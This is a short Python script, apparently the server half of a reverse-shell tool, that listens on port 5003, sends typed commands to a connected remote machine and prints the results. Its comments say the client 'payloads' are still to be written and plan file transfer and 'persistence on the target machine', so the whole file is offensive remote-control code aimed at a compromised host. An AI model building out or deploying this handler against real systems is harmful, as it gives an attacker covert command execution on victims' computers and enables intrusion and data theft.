import socket
"""exactly what it says on the title. still untested but should work. this is the server side, the client side is in the payloads folder....which i still need to write :D"""

### TODO: - Implement basic command execution functionality
###       - Add support for file upload and download
###       - Implement a secure authentication mechanism
###       - Add functionality to maintain persistence on the target machine
###       - Implement logging and reporting features
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
   command = input(f"{cwd} $> ")
   if not command.strip():
       continue
   client_socket.send(command.encode())
   if command.lower() == "exit":
       break
   output = client_socket.recv(BUFFER_SIZE).decode()
   results, cwd = output.split(SEPARATOR)
   print(results)